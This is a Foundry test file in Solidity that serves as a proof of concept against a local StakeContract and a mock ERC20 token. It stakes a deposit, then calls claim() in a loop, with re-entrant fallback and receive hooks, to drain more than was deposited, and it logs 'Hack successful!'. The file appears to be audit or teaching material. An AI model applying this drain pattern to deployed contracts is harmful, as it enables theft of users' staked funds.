// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.10;
pragma experimental ABIEncoderV2;

import "ds-test/test.sol";
import {console} from "forge-std/console.sol";
import "forge-std/Test.sol";

import "../StakeContract.sol";
import "./mocks/MockERC20.sol";

contract ERC20ReentrancyPOCTest is DSTest, Test {
    // contract variables
    StakeContract public stakeContract;
    MockERC20 public mockToken;

    fallback() external payable {
        if (mockToken.balanceOf(address(stakeContract)) > 0) {
            stakeContract.claim(1e18, address(mockToken));
        }
    }

    receive() external payable {
        if (mockToken.balanceOf(address(stakeContract)) > 0) {
            stakeContract.claim(1e18, address(mockToken));
        }
    }

    // create new contract instance
    function setUp() public {
        stakeContract = new StakeContract();
        mockToken = new MockERC20();
    }

    function collectEther() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

    // function test_staking_tokens_fuzz(uint256 amount) public {
    //     mockToken.approve(address(stakeContract), amount);
    //     bool stakePassed = stakeContract.stake(amount, address(mockToken));
    //     assertTrue(stakePassed);
    // }

    // arguments allow foundry to use its fuzzer
    // uint256 big numbers and check
    function testExample() public {
        uint256 amountToDeposit = 1e18;
        uint256 amountDrained = 0;
        // vm.deal(address(this), 1 ether);
        // console.logString("Eth balance: ");
        // console.logUint(address(this).balance);

        mockToken.approve(address(stakeContract), type(uint256).max);
        mockToken.transfer(address(stakeContract), amountToDeposit * 2);
        console.log("[current balance of stake contract]");
        console.logUint(mockToken.balanceOf(address(stakeContract)));
        stakeContract.stake(amountToDeposit, address(mockToken));
        uint256 stakeContractAfterStake = mockToken.balanceOf(address(stakeContract));
        console.log("[current balance of stake contract]");
        console.logUint(stakeContractAfterStake);
        console.log("[current deposit inside the stake contract]", amountToDeposit);

        // StakeContract(payable(address(stakeContract))).claim(10e18, address(mockToken));

        do {
            // try stakeContract.claim(1e18, address(mockToken)) {} catch {}
            amountDrained += 1e18;
            try stakeContract.claim(1e18, address(mockToken)) {}
            catch {
                break;
            }
        } while (mockToken.balanceOf(address(stakeContract)) > 0);
        console.log(amountDrained);

        console.log(amountDrained > amountToDeposit ? "Hack successful!" : "Hack failed :(");
        // console.logUint(mockToken.balanceOf(address(this)));
    }
}
